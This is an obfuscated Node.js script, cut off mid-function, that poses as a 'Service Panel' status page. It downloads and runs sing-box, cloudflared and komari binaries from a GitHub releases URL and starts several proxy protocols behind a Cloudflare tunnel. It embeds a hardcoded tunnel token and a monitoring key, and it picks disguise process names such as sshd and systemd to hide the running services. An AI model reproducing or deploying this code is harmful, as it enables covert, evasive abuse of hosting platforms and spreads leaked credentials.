const b = 'const _0x3fd3=['https://github.com/seav1/dl/releases/download/files/cf-arm','VMESS_UUID','status-stopped','REALITY_PORT','none','google','TUIC_PORT','config.json','K_K','TUIC_PASSWORD','tmpdir','\x22\x20check\x20-c\x20\x22','warn','SIGTERM',':</span></div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22value\x22\x20id=\x22','.log','pipe','keys','dbus-daemon','Hysteria2','\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h3>Sing-Box</h3>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div>','block','https://ipv4.icanhazip.com','random','node','find','http-proxy-middleware','php-fpm','stdout','child_process','REALITY_SHORT_ID','toLowerCase','ruby','express','mongod','text/html','/vms','createServer','https://github.com/seav1/dl/releases/download/files/ko','\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h3>komari</h3>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div>','postgres','cubic','status-running','silent','0.0.0.0','direct','length','unlinkSync','x64','running','error','arm64','data','cache.db','auto','--no-autoupdate','http2','VMESS_PATH','java','redis-server','PORT','arch','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22info-item\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22label\x22><span\x20class=\x22protocol\x22>','?congestion_control=cubic&udp_relay_mode=native&alpn=h3,spdy/3.1&allow_insecure=1#TUIC','&alpn=h3#HY2','env','&type=tcp#REALITY','/health','exit','8.8.8.8','<div\x20class=\x22port-item\x22><div\x20class=\x22port-label\x22>Hysteria2</div><div\x20class=\x22port-value\x22>','komari','tuic','vless://','https://github.com/seav1/dl/releases/download/files/ko-arm','REALITY_PUBLIC_KEY','REALITY_PRIVATE_KEY','eyJhIjoiZjAzMGY1ZDg4OGEyYmRlN2NiMDg3NTU5MzM4ZjE0OTciLCJ0IjoiMjYxYjNjZjgtNDFlOC00MTViLTk2MTAtYWI0NWQwODkxNmU1IiwicyI6Ik16TTJaak14T0dJdFpUVmlaaTAwWVdNMUxUbG1NV1F0T0RBeVpEQXpabUV5TkRKbSJ9','chrome','http://localhost:','syslogd','crypto','trim','www.bing.com','protocol','singbox','stopped','ntpd','cloudflared','http','Reality','?insecure=1&sni=','VMESS_PORT','some','rsyslogd','</div></div>','</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22port-info\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22label\x22>Configured\x20Ports:</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22port-grid\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22port-item\x22><div\x20class=\x22port-label\x22>HTTP</div><div\x20class=\x22port-value\x22>','B_D','nginx','push','--url','tunnel','apache2','10s','!\x27))\x22>Copy</button>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20','0123456789abcdef','TUIC_UUID','forEach','writeHead','VMESS','tuic-in','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20','get','stringify','\x0a\x20\x20\x20\x20\x20\x20\x20\x20<html>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<head>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<title>Service\x20Status</title>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20charset=\x22UTF-8\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20name=\x22viewport\x22\x20content=\x22width=device-width,\x20initial-scale=1.0\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<style>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20body{font-family:Arial,sans-serif;margin:40px;background-color:#f5f5f5}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.container{max-width:900px;margin:0\x20auto;background:white;padding:30px;border-radius:8px;box-shadow:0\x202px\x2010px\x20rgba(0,0,0,0.1)}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20h1{color:#333;text-align:center;margin-bottom:30px}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.status-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:20px;margin-bottom:30px}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.status-card{padding:20px;background:#f8f9fa;border-radius:8px;text-align:center}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.status-card\x20h3{margin:0\x200\x2010px\x200;color:#555}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.status-running{background:#d4edda;color:#155724}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.status-stopped{background:#f8d7da;color:#721c24}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.info-item{margin:20px\x200;padding:15px;background:#f8f9fa;border-radius:5px}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.label{font-weight:bold;color:#555;margin-bottom:10px}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.value{font-family:monospace;background:#e9ecef;padding:10px;border-radius:4px;word-break:break-all;font-size:12px}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.copy-btn{background:#007cba;color:white;border:none;padding:8px\x2015px;border-radius:3px;cursor:pointer;margin-top:10px}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.copy-btn:hover{background:#0056b3}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.protocol{color:#28a745;font-weight:bold}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.nav{text-align:center;margin-bottom:20px}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.nav\x20a{margin:0\x2010px;color:#007cba;text-decoration:none}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.nav\x20a:hover{text-decoration:underline}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.port-info{margin:20px\x200;padding:15px;background:#e9ecef;border-radius:5px}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.port-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:10px;margin-top:10px}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.port-item{background:#fff;padding:10px;border-radius:4px;text-align:center;box-shadow:0\x201px\x203px\x20rgba(0,0,0,0.1)}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.port-label{font-weight:bold;color:#555}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.port-value{font-family:monospace;color:#28a745;margin-top:5px}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</style>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<script>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20function\x20refreshPage()\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20location.reload();\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20setInterval(refreshPage,\x2030000);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</script>\x0a\x20\x20\x20\x20\x20\x20\x20\x20</head>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<body>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22container\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22nav\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<a\x20href=\x22/\x22>Home</a>\x20|\x20<a\x20href=\x22/status\x22>Status</a>\x20|\x20<a\x20href=\x22javascript:refreshPage()\x22>Refresh</a>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h1>Service\x20Status</h1>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22status-grid\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22status-card\x20','toString','createWriteStream','utf8','all','match','killed','HY2_PORT','789456','kill','<div\x20class=\x22port-item\x22><div\x20class=\x22port-label\x22>TUIC</div><div\x20class=\x22port-value\x22>','url','polkitd','join','stderr','upgrade','C_T','randomBytes','logFile','REALITY_SNI','C_D','dockerd','catch','--token','cloudflare'];const _0x4340=function(_0x3fd36f,_0x43401){_0x3fd36f=_0x3fd36f-0x0;let _0x1060d5=_0x3fd3[_0x3fd36f];return _0x1060d5;};const http=require(_0x4340('0x59'));const https=require('https');const fs=require('fs');const path=require('path');const os=require('os');const {spawn,exec}=require(_0x4340('0x1d'));const {URL}=require('url');const crypto=require(_0x4340('0x51'));const net=require('net');const express=require(_0x4340('0x21'));const {createProxyMiddleware}=require(_0x4340('0x1a'));const axios=require('axios');const CONFIG={'C_T':process['env'][_0x4340('0x82')]||_0x4340('0x4d'),'B_D':process['env']['B_D']||'loc.gov','C_D':process[_0x4340('0x41')]['C_D']||'huggingface3.seav.eu.org','K_S':process['env']['K_S']||'https://komari.seav.eu.org','K_K':process['env'][_0x4340('0x8')]||'hWB6PgxSoKUp1p0daF','HY2_PORT':process['env'][_0x4340('0x79')]||process['env']['SERVER_PORT']||'','VMESS_PORT':process[_0x4340('0x41')][_0x4340('0x5c')]||'8001','REALITY_PORT':process['env'][_0x4340('0x3')]||'','TUIC_PORT':process['env']['TUIC_PORT']||'','SERVER_IP':process[_0x4340('0x41')]['SERVER_IP']||'','VMESS_UUID':process['env'][_0x4340('0x1')]||'feefeb96-bfcf-4a9b-aac0-6aac771c1b98','TUIC_UUID':process['env'][_0x4340('0x6a')]||'feefeb96-bfcf-4a9b-aac0-6aac771c1b98','TUIC_PASSWORD':process['env'][_0x4340('0x9')]||_0x4340('0x7a'),'HY2_PASSWORD':process['env']['HY2_PASSWORD']||_0x4340('0x7a'),'REALITY_PRIVATE_KEY':process[_0x4340('0x41')]['REALITY_PRIVATE_KEY']||'','REALITY_PUBLIC_KEY':process[_0x4340('0x41')][_0x4340('0x4b')]||'','HY2_SNI':process[_0x4340('0x41')]['HY2_SNI']||_0x4340('0x53'),'VMESS_PATH':process['env']['VMESS_PATH']||_0x4340('0x24'),'REALITY_SNI':process['env']['REALITY_SNI']||'www.microsoft.com','REALITY_SHORT_ID':process['env'][_0x4340('0x1e')]||_0x4340('0x69'),'PORT':process['env'][_0x4340('0x3c')]||0x1eb4};const WORK_DIR=os[_0x4340('0xa')]();const processes=[];let serviceStatus={'singbox':_0x4340('0x56'),'cloudflared':_0x4340('0x56'),'komari':_0x4340('0x56'),'http':'stopped'};const HTML_TEMPLATES={'home':'\x0a\x20\x20\x20\x20\x20\x20\x20\x20<html>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<head>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<title>Service\x20Panel</title>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20charset=\x22UTF-8\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20name=\x22viewport\x22\x20content=\x22width=device-width,\x20initial-scale=1.0\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<style>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20body{font-family:Arial,sans-serif;margin:0;padding:0;background:linear-gradient(135deg,#667eea\x200%,#764ba2\x20100%);min-height:100vh;display:flex;align-items:center;justify-content:center}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.container{text-align:center;background:white;padding:60px\x2040px;border-radius:15px;box-shadow:0\x2010px\x2030px\x20rgba(0,0,0,0.2);max-width:500px;margin:20px}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20h1{color:#333;font-size:2.5em;margin-bottom:20px;font-weight:300}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20p{color:#666;font-size:1.2em;line-height:1.6;margin-bottom:30px}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.icon{font-size:4em;margin-bottom:20px;color:#667eea;font-weight:bold}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.footer{color:#999;font-size:0.9em;margin-top:30px}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.nav-links{margin-top:30px}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.nav-links\x20a{display:inline-block;margin:0\x2010px;padding:10px\x2020px;background:#667eea;color:white;text-decoration:none;border-radius:5px;transition:background\x200.3s}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.nav-links\x20a:hover{background:#5a67d8}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</style>\x0a\x20\x20\x20\x20\x20\x20\x20\x20</head>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<body>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22container\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22icon\x22>[!]</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h1>Service\x20Panel</h1>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<p>Multi-protocol\x20service\x20management\x20panel.</p>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22nav-links\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<a\x20href=\x22/status\x22>View\x20Status</a>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22footer\x22>Service\x20Management\x20Panel</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20</body>\x0a\x20\x20\x20\x20\x20\x20\x20\x20</html>\x0a\x20\x20\x20\x20','status':(_0x4d3781,_0x2bbc50)=>_0x4340('0x72')+(serviceStatus['singbox']==='running'?'status-running':_0x4340('0x2'))+_0x4340('0x14')+serviceStatus[_0x4340('0x55')]+'</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22status-card\x20'+(serviceStatus[_0x4340('0x58')]==='running'?_0x4340('0x2a'):_0x4340('0x2'))+'\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h3>Cloudflared</h3>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div>'+serviceStatus[_0x4340('0x58')]+'</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22status-card\x20'+(serviceStatus['komari']===_0x4340('0x31')?'status-running':_0x4340('0x2'))+_0x4340('0x27')+serviceStatus['komari']+'</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22status-card\x20'+(serviceStatus[_0x4340('0x59')]==='running'?_0x4340('0x2a'):_0x4340('0x2'))+'\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h3>HTTP\x20Server</h3>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div>'+serviceStatus['http']+_0x4340('0x60')+CONFIG['PORT']+'</div></div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20'+(CONFIG[_0x4340('0x5c')]?'<div\x20class=\x22port-item\x22><div\x20class=\x22port-label\x22>VMESS</div><div\x20class=\x22port-value\x22>'+CONFIG[_0x4340('0x5c')]+_0x4340('0x5f'):'')+_0x4340('0x6f')+(CONFIG['HY2_PORT']?_0x4340('0x46')+CONFIG['HY2_PORT']+'</div></div>':'')+'\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20'+(CONFIG[_0x4340('0x3')]?'<div\x20class=\x22port-item\x22><div\x20class=\x22port-label\x22>Reality</div><div\x20class=\x22port-value\x22>'+CONFIG[_0x4340('0x3')]+'</div></div>':'')+_0x4340('0x6f')+(CONFIG[_0x4340('0x6')]?_0x4340('0x7c')+CONFIG['TUIC_PORT']+'</div></div>':'')+'\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22info-item\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22label\x22>Server\x20IP:</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22value\x22>'+_0x4d3781+'</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20'+(_0x2bbc50[_0x4340('0x2e')]>0x0?_0x2bbc50['map'](_0x110b10=>_0x4340('0x3e')+_0x110b10['protocol']+_0x4340('0xe')+_0x110b10[_0x4340('0x54')]['toLowerCase']()+'\x22>'+_0x110b10[_0x4340('0x7d')]+'</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<button\x20class=\x22copy-btn\x22\x20onclick=\x22navigator.clipboard.writeText(\x27'+_0x110b10['url']+'\x27).then(()=>alert(\x27Copied\x20'+_0x110b10['protocol']+_0x4340('0x68'))['join'](''):'<div\x20class=\x22info-item\x22><div\x20class=\x22label\x22>No\x20active\x20connections</div></div>')+'\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20</body>\x0a\x20\x20\x20\x20\x20\x20\x20\x20</html>\x0a\x20\x20\x20\x20'};const COMMON_PROCESS_NAMES=['sshd',_0x4340('0x62'),_0x4340('0x66'),'httpd','mysqld',_0x4340('0x28'),_0x4340('0x3b'),'memcached',_0x4340('0x57'),'systemd','crond',_0x4340('0x5e'),'supervisord',_0x4340('0x18'),'python',_0x4340('0x1b'),_0x4340('0x3a'),_0x4340('0x20'),_0x4340('0x22'),_0x4340('0x87'),'containerd','snapd','logrotate','udevd',_0x4340('0x50'),_0x4340('0x12'),'cron','atd','dhclient',_0x4340('0x7e'),'irqbalance'];function getRandomProcessName(){return COMMON_PROCESS_NAMES[Math['floor'](Math[_0x4340('0x17')]()*COMMON_PROCESS_NAMES['length'])];}function detectArch(){const _0xb09f9=process[_0x4340('0x3d')];return _0xb09f9===_0x4340('0x30')?'amd64':_0xb09f9===_0x4340('0x33')?'arm64':(process[_0x4340('0x44')](0x1),'');}async function downloadBinary(_0x45e701,_0x451a7a){try{const _0x495898=await axios({'method':'GET','url':_0x45e701,'responseType':'stream'});const _0x323bd4=fs['createWriteStream'](_0x451a7a);_0x495898['data'][_0x4340('0x10')](_0x323bd4);return new Promise((_0x1039e3,_0x8a2da3)=>{_0x323bd4['on']('finish',()=>{fs['chmodSync'](_0x451a7a,0x1ed);_0x1039e3();});_0x323bd4['on'](_0x4340('0x32'),_0x8a2da3);});}catch(_0x30e26c){throw _0x30e26c;}}async function getServerIP(){try{const _0x686d8=await axios[_0x4340('0x70')](_0x4340('0x16'));return _0x686d8[_0x4340('0x34')][_0x4340('0x52')]();}catch(_0xc18307){return'127.0.0.1';}}async function startTempTunnel(_0x58ef0c,_0x1cda02){return new Promise(_0x396b34=>{for(let _0x3e75c7=0x0;_0x3e75c7<0x3;_0x3e75c7++){const _0x58823a=path['join'](WORK_DIR,'cf_'+crypto[_0x4340('0x83')](0x4)['toString']('hex')+_0x4340('0xf'));const _0x994f0c=spawn(_0x58ef0c,[_0x4340('0x65'),_0x4340('0x37'),_0x4340('0x64'),_0x4340('0x4f')+_0x1cda02],{'stdio':['ignore','pipe',_0x4340('0x10')]});processes['push'](_0x994f0c);const _0x9a7e18=fs[_0x4340('0x74')](_0x58823a);_0x994f0c[_0x4340('0x1c')][_0x4340('0x10')](_0x9a7e18);_0x994f0c['stderr'][_0x4340('0x10')](_0x9a7e18);serviceStatus[_0x4340('0x58')]=_0x4340('0x31');_0x994f0c['on'](_0x4340('0x32'),()=>{serviceStatus[_0x4340('0x58')]='error';});_0x994f0c['on'](_0x4340('0x44'),_0x34b75a=>{if(_0x34b75a!==0x0){serviceStatus[_0x4340('0x58')]=_0x4340('0x56');}});setTimeout(()=>{try{const _0x15f859=fs['readFileSync'](_0x58823a,_0x4340('0x75'));const _0x10233b=_0x15f859[_0x4340('0x77')](/https:\/\/([^\/\s]+\.trycloudflare\.com)/);if(_0x10233b){CONFIG['C_D']=_0x10233b[0x1];try{fs[_0x4340('0x2f')](_0x58823a);}catch(_0x1f00f7){}return _0x396b34(!![]);}}catch(_0x1aa7ba){}_0x994f0c[_0x4340('0x7b')]();try{fs[_0x4340('0x2f')](_0x58823a);}catch(_0x1f9806){}if(_0x3e75c7===0x2){serviceStatus['cloudflared']=_0x4340('0x32');_0x396b34(![]);}},0x2710);}});}async function generateRealityKeys(_0x39d783){if(!CONFIG[_0x4340('0x3')]||CONFIG[_0x4340('0x4c')]&&CONFIG[_0x4340('0x4b')]){return;}return new Promise(_0x20bd6f=>{exec('\x22'+_0x39d783+'\x22\x20generate\x20reality-keypair',(_0x509970,_0x4bf3c8)=>{if(!_0x509970&&_0x4bf3c8){const _0x409b35=_0x4bf3c8[_0x4340('0x77')](/PrivateKey:\s*(\S+)/);const _0x3a2cf9=_0x4bf3c8[_0x4340('0x77')](/PublicKey:\s*(\S+)/);if(_0x409b35&&_0x3a2cf9){CONFIG[_0x4340('0x4c')]=_0x409b35[0x1];CONFIG['REALITY_PUBLIC_KEY']=_0x3a2cf9[0x1];}}_0x20bd6f();});});}async function generateSingBoxConfig(){const _0x56e724=[];if(CONFIG[_0x4340('0x79')]){_0x56e724[_0x4340('0x63')]({'type':'hysteria2','tag':'hy2-in','listen':'0.0.0.0','listen_port':parseInt(CONFIG['HY2_PORT']),'users':[{'password':CONFIG['HY2_PASSWORD']}],'tls':{'enabled':!![],'server_name':CONFIG['HY2_SNI'],'insecure':!![],'alpn':['h3']}});}if(CONFIG['VMESS_PORT']){_0x56e724['push']({'type':'vmess','tag':'vmess-in','listen':_0x4340('0x2c'),'listen_port':parseInt(CONFIG[_0x4340('0x5c')]),'users':[{'uuid':CONFIG[_0x4340('0x1')],'alterId':0x0}],'transport':{'type':'ws','path':CONFIG[_0x4340('0x39')],'headers':{}}});}if(CONFIG[_0x4340('0x3')]){_0x56e724['push']({'type':'vless','tag':'reality-in','listen':_0x4340('0x2c'),'listen_port':parseInt(CONFIG[_0x4340('0x3')]),'users':[{'uuid':CONFIG['VMESS_UUID'],'flow':'xtls-rprx-vision'}],'tls':{'enabled':!![],'server_name':CONFIG[_0x4340('0x85')],'reality':{'enabled':!![],'handshake':{'server':CONFIG[_0x4340('0x85')],'server_port':0x1bb},'private_key':CONFIG[_0x4340('0x4c')],'short_id':[CONFIG['REALITY_SHORT_ID']]}}});}if(CONFIG['TUIC_PORT']){_0x56e724['push']({'type':_0x4340('0x48'),'tag':_0x4340('0x6e'),'listen':_0x4340('0x2c'),'listen_port':parseInt(CONFIG[_0x4340('0x6')]),'users':[{'uuid':CONFIG[_0x4340('0x6a')],'password':CONFIG['TUIC_PASSWORD']}],'congestion_control':_0x4340('0x29'),'auth_timeout':'3s','zero_rtt_handshake':![],'heartbeat':_0x4340('0x67'),'tls':{'enabled':!![],'server_name':CONFIG['HY2_SNI'],'insecure':!![],'alpn':['h3']}});}const _0x4c6df9={'log':{'level':_0x4340('0xc'),'timestamp':!![]},'dns':{'servers':[{'tag':_0x4340('0x5'),'address':_0x4340('0x45')},{'tag':_0x4340('0x8a'),'address':'1.1.1.1'}],'final':_0x4340('0x5')},'inbounds':_0x56e724,'outbounds':[{'type':'direct','tag':_0x4340('0x2d')},{'type':_0x4340('0x15'),'tag':'block'}],'route':{'rules':[{'ip_is_private':!![],'outbound':'direct'}],'final':_0x4340('0x2d')},'experimental':{'cache_file':{'enabled':!![],'path':path['join'](WORK_DIR,_0x4340('0x35'))}}};const _0x445c22=path[_0x4340('0x7f')](WORK_DIR,_0x4340('0x7'));fs['writeFileSync'](_0x445c22,JSON['stringify'](_0x4c6df9,null,0x2));return _0x445c22;}function generateLinks(_0x3912f2){const 